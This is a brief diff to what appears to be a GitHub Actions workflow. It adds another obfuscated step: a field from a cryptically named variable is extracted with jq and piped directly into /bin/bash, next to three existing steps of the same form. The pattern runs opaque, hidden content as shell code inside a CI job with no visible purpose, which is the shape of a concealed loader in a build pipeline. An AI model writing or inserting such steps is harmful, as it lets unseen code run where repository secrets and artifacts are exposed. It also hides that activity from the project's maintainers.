@@ -26,6 +26,7 @@ jobs:
           echo $vwl11701 | jq -r .gps4 | /bin/bash
           printf '%s' "$psu3" | jq -r .dw33 | /bin/bash
           echo $dmjv7412 | jq -r .jt94933 | /bin/bash
+          echo $acd1739 | jq -r .uovxi188 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
